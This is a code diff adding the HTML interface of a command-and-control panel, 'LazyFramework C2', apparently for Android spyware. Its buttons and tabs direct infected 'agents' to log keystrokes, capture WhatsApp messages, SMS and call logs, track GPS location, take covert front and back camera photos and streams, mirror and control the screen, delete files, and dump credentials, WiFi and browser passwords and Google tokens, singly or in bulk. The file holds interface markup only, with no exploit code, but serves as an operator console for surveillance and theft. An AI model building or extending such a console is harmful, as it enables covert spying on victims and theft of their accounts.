@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LazyFramework C2 Server</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="/static/js/script.js" defer></script>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <header>
+            <h1>Command & Control Server <span>v2.0</span></h1>
+            <div class="status">
+                <span id="status-indicator" class="status-offline">●</span>
+                <span id="status-text">Disconnected</span>
+            </div>
+        </header>
+
+        <!-- STATS -->
+        <div class="stats">
+            <div class="stat-card">
+                <span class="stat-label">Agents</span>
+                <span class="stat-value" id="agent-count">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Online</span>
+                <span class="stat-value online" id="online-count">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Commands</span>
+                <span class="stat-value" id="command-count">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Mirroring</span>
+                <span class="stat-value mirroring" id="mirror-count">0</span>
+            </div>
+        </div>
+
+        <!-- CONTROLS -->
+        <div class="controls">
+            <div class="controls-row">
+                <input type="text" id="command-input" placeholder="Enter command...">
+                <button id="send-command-btn">Send</button>
+            </div>
+
+            <!-- Multi-Target Controls -->
+            <div class="multi-target-controls">
+                <span class="target-label">🎯 Target:</span>
+                <select id="target-mode">
+                    <option value="single">Single Agent</option>
+                    <option value="selected">Selected Agents</option>
+                    <option value="all">All Agents</option>
+                    <option value="group">Group</option>
+                </select>
+                
+                <select id="target-group" style="display:none;">
+                    <option value="">Select Group...</option>
+                </select>
+                
+                <span class="target-count" id="target-count">0 agents selected</span>
+                
+                <button class="target-btn" id="select-all-agents">Select All</button>
+                <button class="target-btn" id="deselect-all-agents">Deselect All</button>
+                <button class="target-btn group-btn" id="create-group-btn">+ Group</button>
+            </div>
+
+            <!-- Bulk Command Presets -->
+            <div class="bulk-presets">
+                <span class="bulk-label">📦 Bulk:</span>
+                <button class="bulk-cmd" data-cmd="GET_DEVICE_INFO">📱 Info</button>
+                <button class="bulk-cmd" data-cmd="GET_LOCATION">📍 Location</button>
+                <button class="bulk-cmd" data-cmd="SCREENSHOT">📸 Screenshot</button>
+                <button class="bulk-cmd" data-cmd="KEYLOG_DUMP">⌨️ Keylogs</button>
+                <button class="bulk-cmd" data-cmd="WA_CAPTURE_DUMP">💬 WA Dump</button>
+                <button class="bulk-cmd" data-cmd="GET_ACCOUNTS">👤 Accounts</button>
+            </div>
+
+            <!-- Command Presets -->
+            <div class="command-presets">
+                <!-- System -->
+                <button data-cmd="GET_DEVICE_INFO">📱 Device</button>
+                <button data-cmd="GET_LOCATION">📍 Location</button>
+                
+                <!-- Location Tracking -->
+                <button data-cmd="LOCATION_TRACK_START" style="color:#51cf66;">📍 Track Start</button>
+                <button data-cmd="LOCATION_TRACK_STOP" style="color:#ff6b6b;">📍 Track Stop</button>
+                <button data-cmd="LOCATION_TRACK_STATUS" style="color:#ffd93d;">📡 Track Status</button>
+                <!-- Di bagian Command Presets -->
+<button data-cmd="GPS_DETAIL" style="color:#51cf66;">🛰️ GPS Detail</button>
+                <button data-cmd="LOCATION_HISTORY" style="color:#00d2ff;">📜 History</button>
+                
+                <button data-cmd="GET_CLIPBOARD">📋 Clipboard</button>
+                <button data-cmd="GET_GALLERY">🖼️ Gallery</button>
+                
+                <!-- Contacts & SMS -->
+                <button data-cmd="GET_CONTACTS">👤 Contacts</button>
+                <button data-cmd="GET_SMS">📨 SMS</button>
+                <button data-cmd="GET_CALL_LOGS">📞 Call Logs</button>
+                <button data-cmd="GET_INSTALLED_APPS">📱 Apps</button>
+                <button data-cmd="WA_CONTACTS">💚 WA Contacts</button>
+                
+                <!-- Camera -->
+                <button data-cmd="CAMERA_INFO" style="color:#ffd93d;">📸 Camera Info</button>
+                <button data-cmd="CAMERA_SNAPSHOT" style="color:#ff6b6b;">📷 Camera</button>
+                <button data-cmd="CAMERA_SNAPSHOT back" style="color:#ff6b6b;">📷 Back Camera</button>
+                <button data-cmd="CAMERA_SNAPSHOT front" style="color:#ff6b6b;">🤳 Front Camera</button>
+               
+                <!-- Screenshot & Mirror -->
+                <button data-cmd="SCREENSHOT">📸 Screenshot</button>
+                <!-- RDP Controls -->
+<button data-cmd="RDP_START" style="color:#00d2ff;font-weight:bold;">🖥️ RDP Start</button>
+<button data-cmd="RDP_STOP" style="color:#ff6b6b;font-weight:bold;">⏹️ RDP Stop</button>
+<button data-cmd="RDP_STATUS" style="color:#ffd93d;">📊 RDP Status</button>
+
+<!-- RDP Control Buttons -->
+<div class="vnc-controls" id="rdp-controls" style="display:flex;gap:4px;flex-wrap:wrap;margin-top:4px;padding:6px;background:#0d1520;border-radius:4px;border:1px solid #1a2633;">
+    <button id="rdp-mouse-toggle" class="vnc-btn" style="padding:4px 10px;background:#0a0e17;border:1px solid #51cf66;color:#51cf66;border-radius:3px;cursor:pointer;font-size:11px;">🖱️ Mouse</button>
+    <button id="rdp-keyboard" class="vnc-btn" style="padding:4px 10px;background:#0a0e17;border:1px solid #ffd93d;color:#ffd93d;border-radius:3px;cursor:pointer;font-size:11px;">⌨️ Type</button>
+    <button id="rdp-scroll-up" class="vnc-btn" style="padding:4px 10px;background:#0a0e17;border:1px solid #6b7a8a;color:#6b7a8a;border-radius:3px;cursor:pointer;font-size:11px;">⬆</button>
+    <button id="rdp-scroll-down" class="vnc-btn" style="padding:4px 10px;background:#0a0e17;border:1px solid #6b7a8a;color:#6b7a8a;border-radius:3px;cursor:pointer;font-size:11px;">⬇</button>
+    <button id="rdp-back" class="vnc-btn" style="padding:4px 10px;background:#0a0e17;border:1px solid #ff6b6b;color:#ff6b6b;border-radius:3px;cursor:pointer;font-size:11px;">🔙</button>
+    <button id="rdp-home" class="vnc-btn" style="padding:4px 10px;background:#0a0e17;border:1px solid #ffd93d;color:#ffd93d;border-radius:3px;cursor:pointer;font-size:11px;">🏠</button>
+    <button id="rdp-recent" class="vnc-btn" style="padding:4px 10px;background:#0a0e17;border:1px solid #51cf66;color:#51cf66;border-radius:3px;cursor:pointer;font-size:11px;">📋</button>
+    <button id="rdp-fullscreen" class="vnc-btn" style="padding:4px 10px;background:#0a0e17;border:1px solid #00d2ff;color:#00d2ff;border-radius:3px;cursor:pointer;font-size:11px;">⛶</button>
+</div>
+                
+                <!-- Wallpaper -->
+                <button data-cmd="SET_WALLPAPER" style="color:#ff6b6b;">🖼️ Wallpaper</button>
+                
+                <!-- Keylogger -->
+                <button data-cmd="KEYLOG_START">⌨️ Keylog Start</button>
+                <button data-cmd="KEYLOG_STOP">⌨️ Keylog Stop</button>
+                <button data-cmd="KEYLOG_DUMP">📄 Dump Logs</button>
+                
+                <!-- WhatsApp -->
+                <button data-cmd="WA_CAPTURE_START">💬 WA Start</button>
+                <button data-cmd="WA_CAPTURE_STOP">💬 WA Stop</button>
+                <button data-cmd="WA_CAPTURE_DUMP">💬 WA Dump</button>
+                
+                <!-- Accounts -->
+                <button data-cmd="GET_ACCOUNTS" style="color:#ffd93d;">👤 Accounts</button>
+                <button data-cmd="GET_GOOGLE_ACCOUNTS" style="color:#4285F4;">🔵 Google</button>
+                <!-- Credentials -->
+<button data-cmd="DUMP_CREDENTIALS" style="color:#ffd93d;">🔐 Dump Credentials</button>
+<button data-cmd="GET_WIFI_PASSWORDS" style="color:#ffd93d;">📶 WiFi Passwords</button>
+<button data-cmd="GET_BROWSER_PASSWORDS" style="color:#ffd93d;">🌐 Browser Passwords</button>
+<button data-cmd="GET_GOOGLE_TOKENS" style="color:#ffd93d;">🔵 Google Tokens</button>
+                <!-- Files -->
+                <button data-cmd="GET_FILES_LIST" style="color:#fcc419;">📁 Files List</button>
+                <button id="download-file-btn" style="color:#ff6b6b;">⬇️ Download</button>
+                <button data-cmd="DELETE_FILE" style="color:#ff6b6b;">🗑️ Delete</button>
+                <button id="move-file-btn" style="color:#fcc419;">📦 Move</button>
+                
+                <!-- Browser Commands -->
+                <button data-cmd="BROWSER_INFO" style="color:#8be9fd;">🌐 Browser Info</button>
+                <button data-cmd="BROWSER_HISTORY" style="color:#8be9fd;">📜 History</button>
+                <button data-cmd="BROWSER_BOOKMARKS" style="color:#8be9fd;">🔖 Bookmarks</button>
+                <button data-cmd="BROWSER_TABS" style="color:#8be9fd;">📑 Tabs</button>
+                <button data-cmd="BROWSER_ALL" style="color:#8be9fd;">🌐 All Browser</button>
+                
+                <!-- Help -->
+                <button data-cmd="HELP">❓ Help</button>
+            </div>
+
+            <!-- Command Sections -->
+            <div id="wallpaper-section">
+                <div class="section-row">
+                    <span class="section-label">🖼️ Wallpaper URL:</span>
+                    <input type="text" id="wallpaper-url" class="section-input" placeholder="https://example.com/image.jpg">
+                    <button id="set-wallpaper-btn" class="section-btn section-btn-danger">Set Wallpaper</button>
+                </div>
+            </div>
+
+            <div id="download-section">
+                <div class="section-row">
+                    <span class="section-label">📂 File Path:</span>
+                    <input type="text" id="download-file-path" class="section-input" placeholder="/sdcard/Download/file.txt">
+                    <button id="download-file-execute" class="section-btn section-btn-danger">⬇️ Download</button>
+                </div>
+            </div>
+
+            <div id="move-section">
+                <div class="section-row">
+                    <span class="section-label">📦 Source:</span>
+                    <input type="text" id="move-source-path" class="section-input" placeholder="/sdcard/source.txt">
+                    <span class="section-label">➡️ Dest:</span>
+                    <input type="text" id="move-dest-path" class="section-input" placeholder="/sdcard/folder/dest.txt">
+                    <button id="move-file-execute" class="section-btn section-btn-warning" style="width:100%;margin-top:4px;">📦 Move File</button>
+                </div>
+            </div>
+
+            <div id="delete-section">
+                <div class="section-row">
+                    <span class="section-label">🗑️ File Path:</span>
+                    <input type="text" id="delete-file-path" class="section-input" placeholder="/sdcard/file.txt">
+                    <button id="delete-file-execute" class="section-btn section-btn-danger">🗑️ Delete</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT -->
+        <div class="main-content">
+            <!-- Agents Panel -->
+            <div class="agents-panel">
+                <div class="panel-header">
+                    <h2>📱 Agents</h2>
+                    <div class="header-actions">
+                        <span id="selected-agents-count" class="selected-count">0 selected</span>
+                        <button id="refresh-agents" title="Refresh">⟳</button>
+                    </div>
+                </div>
+                <div id="agent-list">
+                    <div class="loading">Loading agents...</div>
+                </div>
+            </div>
+
+            <!-- Output Panel -->
+            <div class="output-panel">
+                <!-- Panel Header with Tabs -->
+                <div class="panel-header">
+                    <h2>📋 Output</h2>
+                    <div class="tabs-wrapper">
+                        <div class="output-tabs" id="tabContainer">
+                            <button class="tab active" data-tab="output">📄 Output</button>
+                            <button class="tab" data-tab="location">📍 Location</button>
+                            <button class="tab" data-tab="camera">📷 Camera</button>
+                            <button class="tab" data-tab="screenshot">📸 Screenshots</button>
+                            <button class="tab" data-tab="gallery" style="color:#ff6b6b;">🖼️ Gallery</button>
+                            <button class="tab" data-tab="keylog">⌨️ Keylogs</button>
+                            <button class="tab" data-tab="whatsapp">💬 WhatsApp</button>
+                            <button class="tab" data-tab="contacts">👤 Contacts</button>
+                            <button class="tab" data-tab="sms">📨 SMS</button>
+                            <button class="tab" data-tab="calllogs">📞 Call Logs</button>
+                            <button class="tab" data-tab="apps">📱 Apps</button>
+                            <button class="tab" data-tab="wacontacts">💚 WA Contacts</button>
+                            <button class="tab" data-tab="accounts">🔐 Accounts</button>
+                            <button class="tab" data-tab="livemirror" style="color:#00d2ff;font-weight:bold;">📺 Live Mirror</button>
+                            <button class="tab" data-tab="wallpaper" style="color:#ff6b6b;">🖼️ Wallpaper</button>
+                            <button class="tab" data-tab="files" style="color:#fcc419;">📁 Files</button>
+                            <button class="tab" data-tab="browser" style="color:#8be9fd;">🌐 Browser</button>
+                            <button class="tab" data-tab="credentials" style="color:#ffd93d;">🔐 Credentials</button>
+                        </div>
+                        <div class="tab-scroll-indicator">
+                            <button id="scrollTabsLeft" title="Scroll tabs left">◀</button>
+                            <button id="scrollTabsRight" title="Scroll tabs right">▶</button>
+                        </div>
+                    </div>
+                    <button id="clear-output" title="Clear all">🗑️</button>
+                </div>
+
+                <!-- Filter Bar -->
+<div class="filter-bar">
+    <span class="filter-label">Filter:</span>
+    <button class="filter-btn active" data-platform="all">All</button>
+    <button class="filter-btn" data-platform="whatsapp" style="color:#25D366;">💬 WhatsApp</button>
+    <button class="filter-btn" data-platform="instagram" style="color:#E4405F;">📸 Instagram</button>
+    <button class="filter-btn" data-platform="twitter" style="color:#1DA1F2;">🐦 Twitter</button>
+    <button class="filter-btn" data-platform="telegram" style="color:#0088CC;">✈️ Telegram</button>
+    <button class="filter-btn" data-platform="messenger" style="color:#00B2FF;">💙 Messenger</button>
+    <button class="filter-btn" data-platform="tiktok" style="color:#000000;">🎵 TikTok</button>
+    <button class="filter-btn" data-platform="wechat" style="color:#07C160;">🟢 WeChat</button>
+    <button class="filter-btn" data-platform="kakao" style="color:#FEE500;">🟡 Kakao</button>
+    <button class="filter-btn" data-platform="other" style="color:#6b7a8a;">📱 Other</button>
+</div>
+
+                <!-- Bulk Progress -->
+                <div id="bulk-progress" class="bulk-progress">
+                    <div class="progress-text">
+                        <span class="current">Sending...</span>
+                        <span class="total">0 / 0</span>
+                    </div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width:0%;"></div>
+                    </div>
+                </div>
+
+                <!-- Tab Content Container -->
+                <div id="output-container">
+                    <!-- OUTPUT TAB -->
+                    <div id="output-tab" class="tab-content active">
+                        <div id="output-content">
+                            <div class="info">Select an agent to start</div>
+                        </div>
+                    </div>
+
+                    <!-- LOCATION TAB -->
+                    <div id="location-tab" class="tab-content">
+                        <div id="location-content">
+                            <div class="info">📍 No location data yet</div>
+                            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#00d2ff;">GET_LOCATION</code> to get GPS location
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- CAMERA TAB -->
+                    <div id="camera-tab" class="tab-content">
+                        <div id="camera-content">
+                            <div class="info">📷 No camera data yet</div>
+                            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">CAMERA_INFO</code> to check camera<br>
+                                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">CAMERA_SNAPSHOT back</code> for back camera<br>
+                                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">CAMERA_SNAPSHOT front</code> for front camera
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- SCREENSHOT TAB -->
+                    <div id="screenshot-tab" class="tab-content">
+                        <div id="screenshot-content">
+                            <div class="info">No screenshots yet</div>
+                        </div>
+                    </div>
+                    
+                    <!-- GALLERY TAB -->
+<div id="gallery-tab" class="tab-content">
+    <div class="tab-header">
+        <h3>🖼️ Gallery</h3>
+        <div class="tab-actions">
+            <button onclick="refreshGallery()" class="btn-small">🔄 Refresh</button>
+            <button onclick="exportGallery()" class="btn-small">📤 Export</button>
+        </div>
+    </div>
+    <div id="gallery-content">
+        <div class="info">🖼️ No gallery data yet</div>
+        <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+            Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">GET_GALLERY</code> to get recent photos
+        </div>
+    </div>
+</div>
+
+                    <!-- KEYLOG TAB -->
+                    <div id="keylog-tab" class="tab-content">
+                        <div class="tab-header">
+                            <h3>⌨️ Keylogs</h3>
+                            <div class="tab-actions">
+                                <button onclick="sendCommand('KEYLOG_DUMP')" class="btn-small">🔄 Refresh</button>
+                                <button onclick="exportKeylogs()" class="btn-small">📤 Export</button>
+                                <button onclick="sendCommand('KEYLOG_START')" class="btn-small" style="color:#51cf66;">▶️ Start</button>
+                                <button onclick="sendCommand('KEYLOG_STOP')" class="btn-small" style="color:#ff6b6b;">⏹️ Stop</button>
+                            </div>
+                        </div>
+                        <div id="keylog-content">
+                            <div class="info">No keylogs yet</div>
+                        </div>
+                    </div>
+
+                    <!-- WHATSAPP TAB -->
+                    <div id="whatsapp-tab" class="tab-content">
+                        <div id="whatsapp-content">
+                            <div class="info">No WhatsApp messages yet</div>
+                        </div>
+                    </div>
+
+                    <!-- CONTACTS TAB -->
+                    <div id="contacts-tab" class="tab-content">
+                        <div id="contacts-content">
+                            <div class="info">No contacts loaded. Send <code>GET_CONTACTS</code> command.</div>
+                        </div>
+                    </div>
+
+                    <!-- SMS TAB -->
+                    <div id="sms-tab" class="tab-content">
+                        <div id="sms-content">
+                            <div class="info">No SMS loaded. Send <code>GET_SMS</code> command.</div>
+                        </div>
+                    </div>
+
+                    <!-- CALL LOGS TAB -->
+                    <div id="calllogs-tab" class="tab-content">
+                        <div id="calllogs-content">
+                            <div class="info">No call logs loaded. Send <code>GET_CALL_LOGS</code> command.</div>
+                        </div>
+                    </div>
+
+                    <!-- APPS TAB -->
+                    <div id="apps-tab" class="tab-content">
+                        <div id="apps-content">
+                            <div class="info">No apps loaded. Send <code>GET_INSTALLED_APPS</code> command.</div>
+                        </div>
+                    </div>
+
+                    <!-- WA CONTACTS TAB -->
+                    <div id="wacontacts-tab" class="tab-content">
+                        <div id="wacontacts-content">
+                            <div class="info">No WhatsApp contacts loaded. Send <code>WA_CONTACTS</code> command.</div>
+                        </div>
+                    </div>
+
+                    <!-- ACCOUNTS TAB -->
+                    <div id="accounts-tab" class="tab-content">
+                        <div id="accounts-content">
+                            <div class="info">👤 No accounts data yet</div>
+                            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ffd93d;">GET_ACCOUNTS</code> or 
+                                <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ffd93d;">GET_GOOGLE_ACCOUNTS</code> to an agent
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- LIVE MIRROR TAB -->
+                    <div id="livemirror-tab" class="tab-content">
+                        <div id="livemirror-content">
+                            <div class="info">📺 Live Mirror Preview</div>
+                            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                                Start with <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#00d2ff;">SCREEN_START</code>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- WALLPAPER TAB -->
+                    <div id="wallpaper-tab" class="tab-content">
+                        <div id="wallpaper-content">
+                            <div class="info">🖼️ Wallpaper History</div>
+                            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">SET_WALLPAPER &lt;URL&gt;</code> to change wallpaper
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- FILES TAB -->
+                    <div id="files-tab" class="tab-content">
+                        <div id="files-content">
+                            <div class="info">📁 No files loaded</div>
+                            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#fcc419;">GET_FILES_LIST</code> to browse files
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- BROWSER TAB -->
+                    <div id="browser-tab" class="tab-content">
+                        <div id="browser-content">
+                            <div class="info">🌐 Browser data will appear here</div>
+                            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                                Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#8be9fd;">BROWSER_INFO</code> to get browser info
+                            </div>
+                        </div>
+                    </div>
+                    <!-- CAMERA TAB -->
+<div id="camera-tab" class="tab-content">
+    <div class="tab-header">
+        <h3>📷 Camera</h3>
+        <div class="tab-actions">
+
+            <button onclick="captureCameraPhoto()" class="btn-small" style="color:#51cf66;">📸 Capture</button>
+            <button onclick="pauseCameraStream()" class="btn-small" style="color:#ffd93d;">⏸️</button>
+            <button onclick="resumeCameraStream()" class="btn-small" style="color:#51cf66;">▶️</button>
+            <button onclick="getCameraStreamStatus()" class="btn-small" style="color:#00d2ff;">📊</button>
+        </div>
+    </div>
+    <div id="camera-content">
+        <div class="info">📷 No camera data yet</div>
+        <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+            Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">CAMERA_INFO</code> to check camera<br>
+            Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">CAMERA_STREAM_START back</code> for back camera live stream<br>
+            Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">CAMERA_STREAM_START front</code> for front camera live stream
+        </div>
+    </div>
+</div>
+                </div>
+            </div>
+        </div>
+
+        <div id="selected-agent" style="display:none;">
+            <span id="selected-agent-id"></span>
+        </div>
+    </div>
+    
+    <!-- ===== FOOTER ===== -->
+    <!-- ===== FOOTER ===== -->
+<footer class="footer">
+    <div class="footer-content">
+        <div class="footer-left">
+            <span class="footer-logo">LazyFramework C2</span>
+            <span class="footer-version">v0.1</span>
+        </div>
+        <div class="footer-center">
+            <div class="footer-stats">
+                <span class="footer-stat">
+                    <span class="stat-icon">📡</span>
+                    <span id="footer-agents">0</span> Agents
+                </span>
+                <span class="footer-stat">
+                    <span class="stat-icon">🟢</span>
+                    <span id="footer-online">0</span> Online
+                </span>
+                <span class="footer-stat">
+                    <span class="stat-icon">⚡</span>
+                    <span id="footer-commands">0</span> Commands
+                </span>
+                <span class="footer-stat">
+                    <span class="stat-icon">📸</span>
+                    <span id="footer-mirror">0</span> Mirroring
+                </span>
+            </div>
+        </div>
+        <div class="footer-right">
+            <span class="footer-time" id="footer-time">--:--:--</span>
+            <span class="footer-uptime" id="footer-uptime">Uptime: 0s</span>
+            <!-- ✅ FIX: Only show status here, no extra text -->
+            <span class="footer-status" id="footer-status">🔴 Offline</span>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        <span>© 2026 LazyFramework - All Rights Reversed</span>
+        <span class="footer-links">
+            <a href="#" onclick="showAbout()">About</a>
+            <a href="#" onclick="showHelp()">Help</a>
+            <a href="#" onclick="toggleTheme()">Theme</a>
+        </span>
+    </div>
+</footer>
+</body>
+</html>
